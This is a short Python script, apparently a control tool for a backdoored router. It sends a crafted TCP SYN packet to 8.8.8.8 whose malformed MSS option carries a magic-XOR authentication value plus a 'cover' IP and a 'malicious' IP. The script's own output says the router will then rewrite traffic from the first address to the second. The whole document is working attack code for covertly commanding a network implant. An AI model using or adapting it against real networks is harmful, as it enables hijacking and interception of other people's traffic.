#!/usr/bin/env python
import random
import struct
import socket
import sys
from optparse import OptionParser
from scapy.all import *

XOR_MAGIC = 0xdeadbeef
MAX_UINT32 = 2**32

parser = OptionParser()
parser.add_option("-i", "--ip-innocent", dest='innocent', help="our cover ip")
parser.add_option("-m", "--ip-malicious", dest='malicious', help="our malicous ip")
(options, args) = parser.parse_args()
if not options.innocent: 
    parser.error('innocent ip not given')
if not options.malicious: 
    parser.error('malicious ip not given')

print "router will change %s->%s" % (options.innocent, options.malicious)

random_number = random.randint(0, MAX_UINT32)
xored_random_numer = random_number ^ XOR_MAGIC
print "random 4 bytes number: %d" % random_number
print "xored with magic: %d" %xored_random_numer


ip  = IP(dst="8.8.8.8")
tcp = TCP(sport= random.randint(1000,65000),
          dport= 80, 
          flags   = 'S',
          options = [('MSS',
                      struct.pack("<I", random_number) + 
                      struct.pack("<I", xored_random_numer) +
                      socket.inet_aton(options.innocent) + 
                      socket.inet_aton(options.malicious)
          )])
# using raw socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# dont put headers
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
s.sendto(bytes(ip/tcp), ("8.8.8.8" , 0 ))

# using scpay
#send(ip/tcp)

